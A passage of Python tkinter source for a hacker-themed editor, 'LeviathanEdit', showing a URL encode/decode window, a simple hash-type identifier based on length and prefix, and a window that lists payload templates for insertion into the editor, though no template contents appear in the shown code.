                messagebox.showerror("ERROR", str(e))
        
        tk.Button(btn_frame, text="ENCODE", command=encode_url, bg="#003300", fg="#00ff41", 
                 font=("Consolas", 11, "bold"), padx=20, pady=10).pack(side="left", padx=10)
        tk.Button(btn_frame, text="DECODE", command=decode_url, bg="#330000", fg="#ff4444", 
                 font=("Consolas", 11, "bold"), padx=20, pady=10).pack(side="left", padx=10)

    def open_hash(self):
        w = tk.Toplevel(self.master)
        w.title("HASH IDENTIFIER")
        w.configure(bg="#000011")
        w.geometry("700x500")
        
        tk.Label(w, text="ENTER HASH:", bg="#000011", fg="#00ffaa", font=("Consolas", 12, "bold")).pack(pady=(20,5))
        hash_input = tk.Entry(w, bg="#001122", fg="#00ffaa", font=("Consolas", 12), width=60)
        hash_input.pack(padx=20, pady=10)
        
        tk.Label(w, text="POSSIBLE HASH TYPES:", bg="#000011", fg="#00ffaa", font=("Consolas", 12, "bold")).pack(pady=(20,5))
        result_text = tk.Text(w, height=15, bg="#001122", fg="#00ffaa", font=("Consolas", 11))
        result_text.pack(padx=20, pady=10, fill="both", expand=True)
        
        def identify_hash():
            hash_val = hash_input.get().strip()
            result_text.delete("1.0", "end")
            
            if not hash_val:
                result_text.insert("1.0", "ERROR: No hash provided")
                return
            
            length = len(hash_val)
            results = []

            hex_pattern = r'^[a-fA-F0-9]+$'

            if length == 32 and re.match(hex_pattern, hash_val):
                results.append("MD5 (Message Digest 5)")
                results.append("NTLM (Windows)")
            
            if length == 40 and re.match(hex_pattern, hash_val):
                results.append("SHA-1 (Secure Hash Algorithm 1)")
            
            if length == 56 and re.match(hex_pattern, hash_val):
                results.append("SHA-224")
            
            if length == 64 and re.match(hex_pattern, hash_val):
                results.append("SHA-256")
                results.append("SHA3-256")
                results.append("Keccak-256")
            
            if length == 96 and re.match(hex_pattern, hash_val):
                results.append("SHA-384")
            
            if length == 128 and re.match(hex_pattern, hash_val):
                results.append("SHA-512")
                results.append("SHA3-512")
            
            if hash_val.startswith('$1'):
                results.append("MD5 Crypt")
            
            if hash_val.startswith('$2a') or hash_val.startswith('$2b') or hash_val.startswith('$2y'):
                results.append("bcrypt")
            
            if hash_val.startswith('$5'):
                results.append("SHA-256 Crypt")
            
            if hash_val.startswith('$6'):
                results.append("SHA-512 Crypt")
            
            if hash_val.startswith('$apr1'):
                results.append("APR1 (Apache)")
            
            if not results:
                results.append("UNKNOWN - Could not identify hash type")
                results.append(f"Length: {length} characters")
            
            output = "IDENTIFIED HASH TYPES:\n" + "="*60 + "\n"
            for i, r in enumerate(results, 1):
                output += f"{i}. {r}\n"
            
            result_text.insert("1.0", output)
        
        tk.Button(w, text="IDENTIFY HASH", command=identify_hash, bg="#003300", fg="#00ff41", 
                 font=("Consolas", 12, "bold"), padx=30, pady=12).pack(pady=20)

    def open_templates(self):
        w = tk.Toplevel(self.master)
        w.title("PAYLOAD TEMPLATES")
        w.configure(bg="#000011")
        w.geometry("800x700")
        
        # Scrollable frame
        canvas = tk.Canvas(w, bg="#000011", highlightthickness=0)
        scrollbar = tk.Scrollbar(w, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg="#000011")
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        tk.Label(scrollable_frame, text="CLASSIFIED PAYLOAD DATABASE", 
                font=("Consolas", 16, "bold"), bg="#000011", fg="#ff0066").pack(pady=20)
        
        # Built-in templates
        templates = self.get_builtin_templates()
        
        tk.Label(scrollable_frame, text="BUILT-IN TEMPLATES", 
                font=("Consolas", 14, "bold"), bg="#000011", fg="#00ffaa").pack(pady=10)
        
        for name, code in templates.items():
            frame = tk.Frame(scrollable_frame, bg="#001122", relief="raised", bd=2)
            frame.pack(fill="x", padx=20, pady=8)
            
            tk.Label(frame, text=name, bg="#001122", fg="#00ffaa", 
                    font=("Consolas", 11, "bold"), anchor="w").pack(fill="x", padx=10, pady=5)
            
            tk.Button(frame, text="INSERT INTO EDITOR", 
                     command=lambda c=code: self.text.insert("insert", "\n" + c + "\n"),
                     bg="#003300", fg="#00ff41", font=("Consolas", 9, "bold"),
                     padx=15, pady=8).pack(padx=10, pady=5)
        
        # Custom templates
        if self.custom_templates:
            tk.Label(scrollable_frame, text="CUSTOM TEMPLATES", 
                    font=("Consolas", 14, "bold"), bg="#000011", fg="#ff6600").pack(pady=20)
            
            for name, code in self.custom_templates.items():
                frame = tk.Frame(scrollable_frame, bg="#112200", relief="raised", bd=2)
                frame.pack(fill="x", padx=20, pady=8)
                
                tk.Label(frame, text=name, bg="#112200", fg="#ffaa00", 
                        font=("Consolas", 11, "bold"), anchor="w").pack(fill="x", padx=10, pady=5)
                
                tk.Button(frame, text="INSERT INTO EDITOR", 
                         command=lambda c=code: self.text.insert("insert", "\n" + c + "\n"),
                         bg="#003300", fg="#00ff41", font=("Consolas", 9, "bold"),
                         padx=15, pady=8).pack(padx=10, pady=5)
        
        # Add refresh button
        btn_frame = tk.Frame(scrollable_frame, bg="#000011")
        btn_frame.pack(pady=20)
        
        def reload_templates():
            self.custom_templates = self.load_custom_templates()
            self.create_context_menu()
            w.destroy()
            self.open_templates()
            messagebox.showinfo("TEMPLATES RELOADED", "Custom templates have been refreshed!")
        
        tk.Button(btn_frame, text="🔄 RELOAD CUSTOM TEMPLATES", command=reload_templates,
                 bg="#330033", fg="#ff00ff", font=("Consolas", 11, "bold"),
                 padx=20, pady=12).pack()
        
        canvas.pack(side="left", fill="both", expand=True, padx=10, pady=10)
        scrollbar.pack(side="right", fill="y")

if __name__ == "__main__":
    root = tk.Tk()
    app = LeviathanEdit(root)
    root.mainloop()